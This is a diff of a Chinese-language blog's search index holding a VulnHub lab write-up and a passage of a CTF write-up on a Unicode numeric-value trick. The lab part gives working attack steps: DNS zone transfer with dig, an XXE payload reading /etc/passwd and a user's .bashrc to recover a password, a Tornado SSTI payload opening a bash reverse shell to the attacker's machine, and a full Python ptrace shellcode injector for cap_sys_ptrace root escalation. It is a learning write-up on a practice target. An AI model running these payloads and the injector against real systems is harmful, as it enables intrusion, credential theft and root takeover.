+<p>有的DNS域非常的大，并且域内的信息可能经常改变。此时，如果管理员在该域内的每台DNS服务器上手动的修改信息的话，这不仅耗费大量的时间，而且也容易出错。因此，这时候就需要DNS域传送机制。</p>
+<p>DNS域传送的作用：管理员只需要在主DNS服务器上进行修改，然后其他DNS服务器可以通过某种协议来请求主DNS服务器上的全部信息。其中最简单的协议就是<code>AXFR</code>。</p>
+<h2 id="dns域传送漏洞">DNS域传送漏洞</h2>
+<p>其实主要的是<code>AXFR</code>协议存在漏洞，该协议允许域内所有客户端请求DNS服务器上的信息。只需要获得一台域内的主机，就可以通过该漏洞获得该DNS域内所有子域名。本质上就是一种<strong>信息泄露漏洞</strong>。</p>
+<h2 id="dns域名解析">DNS域名解析</h2>
+<p>DNS服务同时占用TCP和UDP的53端口。DNS在进行域传送的时候使用TCP协议，其它时候则使用UDP协议。</p>
+<p>所以，如果一台主机开启了<code>53/TCP</code>，那么该主机也极大可能开启<code>53/UDP</code>，并且该主机基本可以认定为是一台DNS服务器。但是反过来，如果某台主机开启了<code>53/UDP</code>，那么该主机不一定开启了<code>53/TCP</code>，因此，该主机是DNS服务器的可能性也不大。</p>
+<h1 id="capabilities技术">Capabilities技术</h1>
+<p>Capabilities是Linux的一个内核功能。作用：权限管理。该功能将操作系统很多需要特权才能执行的操作（通常只有root和管理员才能执行的系统操作）分成40+个功能。每一个功能都能单独的赋予给程序。当某个程序被赋予了功能，那么即使执行该程序的只是普通用户（不是root，没有suid，不在root组等），也能够使用对应的特权操作。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setcap</span> cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap</span><br><span class="line"><span class="comment"># 赋予/usr/bin/dumpcap程序抓数据包和抓网络管理相应组件两种能力。</span></span><br></pre></td></tr></table></figure>
+<p>参考文档：<a href="https://linux.die.net/man/7/capabilities">Capabilities</a></p>
+<h1 id="渗透">渗透</h1>
+<p>攻击机kali：10.0.2.4</p>
+<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l <span class="comment"># 靶机为10.0.2.10</span></span><br><span class="line">sudo nmap -p- 10.0.2.10</span><br><span class="line">sudo nmap -p53,80,9999 -A 10.0.2.10</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408084845.png" /></p>
+<p>53端口上是域服务，版本为ISC BIND 9.16.1，并且开启的是53/TCP，有理由认为该主机是域内的DNS服务器，并且53/UDP也是开启着的。输入下面命令验证下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p53 -sU 10.0.2.10</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408085115.png" /></p>
+<p>发现确实如此。ISC BIND 9.16.1 存在着两个远程代码执行漏洞，编号为CVE-2020-8625和CVE-2021-25216（找不到漏洞利用代码）</p>
+<p>80端口和9999端口开着的都是http服务。80端口上是apache2，9999端口上是tornado，这是python语言的一个模板，所以后续可能会用到模板注入！</p>
+<p>靶机的OS是Ubuntu。</p>
+<h2 id="访问http服务">访问http服务</h2>
+<p>先访问80端口，页面如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408085401.png" /></p>
+<p>这里注意到一个大写的单词<code>DIG</code>，这是Linux的一个工具，但是使用该工具需要知道靶机的域名，因此接下来就是需要找到关于域名的信息。</p>
+<p>查看页面源码的小技巧：</p>
+<ol type="1">
+<li>一方面关注这个页面到底引用了哪些页面资源，存在哪些路径</li>
+<li>另一方面得关注<strong>注释信息</strong></li>
+</ol>
+<p>查看源码，在最后发现了某一行注释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TO DO: Use a GET parameter page_no  to view pages.</span><br></pre></td></tr></table></figure></p>
+<p>也就是在该页面上存在着一个参数<code>page_no</code>，以GET方式提交。</p>
+<p>又看了一些其他网址，比如主页上的<code>App</code>和<code>Form</code>，<strong>直接点击会出现<code>10.0.2.10/#from.html</code>，把<code>#</code>去掉就可以直接访问了</strong>。但是，发现虽然有很多表单，但是并没有可用的地方，基本都只是做个样子。</p>
+<p>那先带入<code>page_no</code>去访问一下，看一下页面会不会发生什么变化。尝试了1，2，3，4之后发现变化都一样，多了一句话<code>Oh Man !! Isn't is right to go a little deep inside?</code>，因此用burp来跑，后面肯定还有变化。结果发现，当<code>page_no=21</code>时，返回的响应包长度出现了变化。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408090450.png" /></p>
+<p>直接访问发现页面的话变成了如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Okay so you want me to speak something ?  </span><br><span class="line">I am a hacker kid not a dumb hacker. So i created some subdomains to return back on the server whenever i want!!  </span><br><span class="line">Out of my many homes...one such home..one such home for me : hackers.blackhat.local</span><br></pre></td></tr></table></figure></p>
+<p>发现了一个域名<code>hackers.blackhat.local</code>，这其实是一个三级域名，<code>blackhat.local</code>也是一个域名。因此，获得了两个域名。</p>
+<p>将域名添加到<code>/etc/hosts</code>。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408091613.png" /></p>
+<p>然后直接用浏览器访问，发现<code>hackers.blackhat.local</code>页面和最开始的界面一样，而<code>blackhat.local</code>没有权限访问。</p>
+<p>接下来访问9999端口，发现是一个登录界面</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408091937.png" /></p>
+<p>那两个域名加上9999端口也都是同样的界面，等会测试。</p>
+<h2 id="dns域传送漏洞-1">DNS域传送漏洞</h2>
+<p>利用<code>DIG</code>配合<code>AXFR</code>协议获取更多的域内信息。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig axfr @10.0.2.10 hackers.blackhat.local <span class="comment"># 失败</span></span><br><span class="line">dig axfr @10.0.2.10 blackhat.local</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408092336.png" /></p>
+<p>获得了更多的域名信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hackerkid.blackhat.local</span><br><span class="line">ftp.blackhat.local</span><br><span class="line">mail.blackhat.local</span><br><span class="line">hacker.blackhat.local.blackhat.local</span><br><span class="line">www.blackhat.local</span><br></pre></td></tr></table></figure></p>
+<p>把这些都写入<code>/etc/hosts</code>然后用浏览器直接访问。</p>
+<p>在80端口下，上面5个域名中，第一个域名出现了如下界面</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408093020.png" /></p>
+<p>第五个域名没有权限访问，其他的域名都和原来的界面一样。</p>
+<p>在9999端口下，5个域名访问的和之前9999端口的界面一样。</p>
+<p>填写表单，抓取<code>hackerkid.blackhat.local:80</code>数据包看一下</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408093729.png" /></p>
+<p>发现了两点：</p>
+<ol type="1">
+<li>这个表单是XML提交的</li>
+<li>无论我们在<code>&lt;email&gt;</code>标签内提交什么内容，都会被原封不动的返回回来<code>Sorry, hdfzzf@gmail.com is not available !!!</code></li>
+</ol>
+<p>先分析第二点，不论我们输入什么内容，服务端都会原封不动得返回给我们，这是三种漏洞的特征：</p>
+<ol type="1">
+<li>XSS漏洞</li>
+<li>XXE漏洞</li>
+<li>SSTI漏洞</li>
+</ol>
+<p>又因为这里的表单是XML，所以怀疑这里存在着XXE漏洞。</p>
+<h2 id="xxe漏洞">XXE漏洞</h2>
+<p>先验证以下是否存在XXE漏洞，抓数据包修改，然后发送</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408100434.png" /></p>
+<p>发现确实返回了<code>/etc/passwd</code>中的内容，说明确实存在XXE漏洞。寻找跟<code>/bin/bash</code>有关的账号： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">saket:x:1000:1000:Ubuntu,,,:/home/saket:/bin/bash</span><br></pre></td></tr></table></figure></p>
+<p>然后利用该漏洞读取文件内容： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/home/saket/.bashrc <span class="comment"># bash配置信息</span></span><br><span class="line">/home/saket/id_rsa <span class="comment"># 私钥</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>但是发现什么内容都读取不出来，这时候文件可能存在内容，但是别限制不允许明文输出，于是使用 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/home/saket/.bashrc</span><br></pre></td></tr></table></figure></p>
+<p>将得到的内容解码发现了</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408101522.png" /></p>
+<p>首先猜测这是哪里的密码，因为这台靶机没有开22端口，所以不存在ssh连接。忽然想到，刚刚9999端口存在登陆界面，因此去那里尝试一下。</p>
+<p>发现用下面的信息登录不成功。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: Saket!#$%@!!</span><br></pre></td></tr></table></figure></p>
+<p>但是配置文件中的信息不太可能是假的，那就尝试将用下面信息登录（<code>/bin/bash</code>中有saket这个账号），发现居然成功了。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: saket</span><br><span class="line">password: Saket!#$%@!!</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408102116.png" /></p>
+<p>从上图中的语句中分析，可能我们需要传入一个参数<code>name</code>，当然也可以通过参数爆破，理论上是可行的，不过该靶机不建议爆破，因此先尝试一下。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408103126.png" /></p>
+<p>因此，这里可能<code>name</code>可能存在着某种注入漏洞。经过测试，发现无论我们在后面加入什么值，都会原封不动的返回。根据之前的描述，共有三种情况，但是XSS和XXE不太可能出现在url中，因此猜测可能存在SSTI。并且最开始收集的信息中也显示9999端口上是tornado模板，所以SSTI的可能性很大，并且模板引擎为tornado。</p>
+<h2 id="ssti漏洞-get-shell">SSTI漏洞 Get shell</h2>
+<p>模板注入通杀payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;1+abcxyz&#125;&#125;$&#123;1+abcxyz&#125;&lt;%1+abcxyz%&gt;[abcxyz]</span><br></pre></td></tr></table></figure></p>
+<p>如果存在报错，基本说明服务端存在SSTI。abcxyz尽量选择无规则的字符，这样可以保证服务端没有定义过该变量名。此时，服务端引用该变量名就会报错，从而判断可能存在模板注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;7*7&#125;,&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>看一下哪一个被执行了，从而可以判断模板引擎和语言。前者表示的PHP类模板，而后者表示python类模板。Java模板不多。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408103754.png" /></p>
+<p>如果是python，可以利用下面代码进行反弹shell（kali先开启监听） <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">import</span> os %&#125;&#123;&#123;os.system(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.2.4/3333 0&gt;&amp;1&quot;&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>如果报错了，需要对上述payload进行一些编码，比如url编码（花括号，百分号，引号，斜杠等特殊符号都需要编码）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%7B%25%20import%20os%20%25%7D%7B%7Bos.system(%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.4%2F3333%200%3E%261%22%27)%7D%7D</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408103958.png" /></p>
+<p>成功突破边界！</p>
+<h2 id="权限提升capabilities提权">权限提升——Capabilities提权</h2>
+<p>不论是内核漏洞、sudo配置不当以及suid都没找到可以利用的点。也不能像<code>6 EvilBoxOne</code>一样找到拥有写权限的可利用文件。</p>
+<p>这里介绍一种新的提权方式： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p>上述命令是查看系统上所有程序的功能。<code>-r</code>：递归。如果没有结果，可以先输入<code>getcap</code>查看一下位置在哪，然后 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/sbin/<span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408105514.png" /></p>
+<p><strong>注意<code>cap_sys_ptrace+ep</code>可以用来提权</strong>。也就是上图中的<code>python2.7</code>拥有的功能。参考链接：<a href="https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc">cap_sys_ptrace提权</a></p>
+<p>下载利用脚本，不过链接失效了。下面是脚本的源码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># inject.py# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.</span></span><br><span class="line"><span class="comment"># GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># Macros defined in &lt;sys/ptrace.h&gt;</span></span><br><span class="line"><span class="comment"># https://code.woboq.org/qt5/include/sys/ptrace.h.html</span></span><br><span class="line"></span><br><span class="line">PTRACE_POKETEXT = <span class="number">4</span></span><br><span class="line">PTRACE_GETREGS = <span class="number">12</span></span><br><span class="line">PTRACE_SETREGS = <span class="number">13</span></span><br><span class="line">PTRACE_ATTACH = <span class="number">16</span></span><br><span class="line">PTRACE_DETACH = <span class="number">17</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Structure defined in &lt;sys/user.h&gt;</span></span><br><span class="line"><span class="comment"># https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user_regs_struct</span>(<span class="params">ctypes.Structure</span>):</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;r15&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r14&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r13&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r12&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rbp&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rbx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r11&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r10&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r9&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r8&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rax&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rcx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rdx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rsi&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rdi&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;orig_rax&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rip&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;cs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;eflags&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rsp&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;ss&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;fs_base&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;gs_base&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;ds&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;es&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;fs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;gs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pid = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define argument type and respone type.</span></span><br><span class="line">libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]</span><br><span class="line">libc.ptrace.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Attach to the process</span></span><br><span class="line">libc.ptrace(PTRACE_ATTACH, pid, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">registers = user_regs_struct()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Retrieve the value stored in registers</span></span><br><span class="line">libc.ptrace(PTRACE_GETREGS, pid, <span class="literal">None</span>, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Injecting Shellcode at: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shell code copied from exploit db.</span></span><br><span class="line">shellcode = <span class="string">&quot;\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Inject the shellcode into the running process byte by byte.</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">4</span>):</span><br><span class="line">    <span class="comment"># Convert the byte to little endian.</span></span><br><span class="line">    shellcode_byte_int = <span class="built_in">int</span>(shellcode[i:<span class="number">4</span> + i].encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">    shellcode_byte_little_endian = struct.pack(<span class="string">&quot;&lt;I&quot;</span>, shellcode_byte_int).rstrip(<span class="string">&#x27;\x00&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    shellcode_byte = <span class="built_in">int</span>(shellcode_byte_little_endian, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Inject the byte.</span></span><br><span class="line">    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip + i), shellcode_byte)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Shellcode Injected!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Modify the instuction pointer</span></span><br><span class="line">registers.rip = registers.rip + <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the registers</span></span><br><span class="line">libc.ptrace(PTRACE_SETREGS, pid, <span class="literal">None</span>, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Instruction Pointer: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Detach from the process.</span></span><br><span class="line">libc.ptrace(PTRACE_DETACH, pid, <span class="literal">None</span>, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2.7 inject.py processID <span class="comment"># 将后门进程注入到对应ID的进程</span></span><br></pre></td></tr></table></figure>
+<p>（注意，一定要注入到root用户的进程）</p>
+<p>root的进程很多，所以写一个简单的脚本进行批量化尝试： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> pid <span class="keyword">in</span> `ps -ef|grep root|grep -v <span class="string">&quot;grep&quot;</span>|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`; <span class="keyword">do</span> python2.7 inject.py <span class="variable">$pid</span>; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单说明：ps -ef查看进程情况，一个进程一行，grep root只列出带有root的行（进程），grep -v &quot;grep&quot;不显示带有grep的行（进程），awk &#x27;&#123;print $2&#125;&#x27;显示每一行的第二个位置（从1开始）即PID。</span></span><br></pre></td></tr></table></figure></p>
+<p>该后门利用的是5600端口，如果执行完毕之后该端口开启，说明注入成功 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -tunpla |grep 5600</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408114925.png" /></p>
+<p>然后利用nc连接即可提权到root。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 0.0.0.0 5600</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408115600.png" /></p>
+<p>成功提权，该靶机到此结束。</p>
+<h1 id="总结">总结</h1>
+<p>通过对该靶机的渗透学到了：</p>
+<ul>
+<li>DNS域传送漏洞的利用以及DNS的相关知识</li>
+<li>XXE漏洞即XML相关知识</li>
+<li>SSTI漏洞的get shell方式</li>
+<li>Capabilities技术的提权</li>
+</ul>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>综合</tag>
+        <tag>vulnhub</tag>
+        <tag>DNS域传送漏洞</tag>
+        <tag>Capabilities提权</tag>
+        <tag>SSTI get shell</tag>
+        <tag>XXE漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1768,43 +1768,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ASIS 2019 Unicorn shop</title>
-    <url>/2022/04/08/ASIS%202019%20Unicorn%20shop/</url>
-    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BASIS%202019%5DUnicorn%20shop">UnicornShop</a></p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408193908.png" /></p>
-<p>发现下面有两个输入框，第一个是<code>Item ID</code>，第二个是<code>Price</code>。经过测试，如果我们输入正确的Item ID，会提示<code>Wrong commodity!</code>，如果输入不正确的Item ID，则会提示<code>No commodity found!</code>。<code>Price</code>框只允许输入一个字符。</p>
-<h1 id="解题">解题</h1>
-<p>最开始不知道这道题考点是什么，查看别人的wp之后发现了是<strong>Unicode编码</strong>。</p>
-<p>下面是该题目的源码中关于<code>Price</code>的重要代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">price = urllib.unquote(price).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">...</span><br><span class="line">unicodedate.numeric(price)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
-<p>解释：先是将我们输入的price进行url解码，然后取出字符对应的<code>numeric value</code>。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">unicodedata.numeric(<span class="built_in">chr</span>[, default])</span><br></pre></td></tr></table></figure>
-<p>把分配给字符chr的数值转换为浮点数并返回。比如可以将“四”转为4.0，“8”转为8.0等。不仅仅只局限于0-9的字符，只要是合法的字符都可以，如果是不合法的字符就会报错<code>ValueError</code>。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408194554.png" /></p>
-<p>那么字符对应的<code>numeric value</code>又是什么呢？这里推荐一个网站<a href="https://www.compart.com/en/unicode/">compact</a></p>
-<p>我们选择一个字符查看信息：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195131.png" /></p>
-<p>会发现该字符有一个<code>Numeric Value</code>，但并不是每一个字符都有，比如下面这个就没有</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195227.png" /></p>
-<p>到此就很清晰了，我们输入的字符的<code>Numeric Value</code>要大于商品的价格，就可以获得flag了。</p>
-<p>这里有四个商品，但是前三个商品的价格都不大与9，如果是要购买前三个商品的话，完全就用不到<code>numeric value</code>。经过测试发现，前三个即使价格足够也会提示<code>Wrong commodity</code>，那么就一定是最后一个了。因此，我们需要输入一个字符，这个字符的<code>numeric value</code>要大于1337。可以通过刚刚那个网站搜索thousand然后慢慢找即可。</p>
-<p>这里我用“万”（当然“亿”也可以）</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195716.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195731.png" /></p>
-<p>成功获得flag。</p>
-<h1 id="总结">总结</h1>
-<p>本题给我的感觉更像是杂项。不过我也通过该题学到了字符拥有<code>Numeric Value</code>这个属性。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Unicode</tag>
-        <tag>Numeric Value</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BJDCTF20 Cookie is so stable</title>
     <url>/2022/04/05/BJDCTF20%20Cookie%20is%20so%20stable/</url>
     <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
@@ -1853,6 +1816,43 @@
       </categories>
       <tags>
         <tag>Twig SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ASIS 2019 Unicorn shop</title>
+    <url>/2022/04/08/ASIS%202019%20Unicorn%20shop/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BASIS%202019%5DUnicorn%20shop">UnicornShop</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408193908.png" /></p>
+<p>发现下面有两个输入框，第一个是<code>Item ID</code>，第二个是<code>Price</code>。经过测试，如果我们输入正确的Item ID，会提示<code>Wrong commodity!</code>，如果输入不正确的Item ID，则会提示<code>No commodity found!</code>。<code>Price</code>框只允许输入一个字符。</p>
+<h1 id="解题">解题</h1>
+<p>最开始不知道这道题考点是什么，查看别人的wp之后发现了是<strong>Unicode编码</strong>。</p>
+<p>下面是该题目的源码中关于<code>Price</code>的重要代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">price = urllib.unquote(price).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">...</span><br><span class="line">unicodedate.numeric(price)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>解释：先是将我们输入的price进行url解码，然后取出字符对应的<code>numeric value</code>。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">unicodedata.numeric(<span class="built_in">chr</span>[, default])</span><br></pre></td></tr></table></figure>
+<p>把分配给字符chr的数值转换为浮点数并返回。比如可以将“四”转为4.0，“8”转为8.0等。不仅仅只局限于0-9的字符，只要是合法的字符都可以，如果是不合法的字符就会报错<code>ValueError</code>。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408194554.png" /></p>
+<p>那么字符对应的<code>numeric value</code>又是什么呢？这里推荐一个网站<a href="https://www.compart.com/en/unicode/">compact</a></p>
+<p>我们选择一个字符查看信息：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195131.png" /></p>
+<p>会发现该字符有一个<code>Numeric Value</code>，但并不是每一个字符都有，比如下面这个就没有</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195227.png" /></p>
+<p>到此就很清晰了，我们输入的字符的<code>Numeric Value</code>要大于商品的价格，就可以获得flag了。</p>
+<p>这里有四个商品，但是前三个商品的价格都不大与9，如果是要购买前三个商品的话，完全就用不到<code>numeric value</code>。经过测试发现，前三个即使价格足够也会提示<code>Wrong commodity</code>，那么就一定是最后一个了。因此，我们需要输入一个字符，这个字符的<code>numeric value</code>要大于1337。可以通过刚刚那个网站搜索thousand然后慢慢找即可。</p>
+<p>这里我用“万”（当然“亿”也可以）</p>
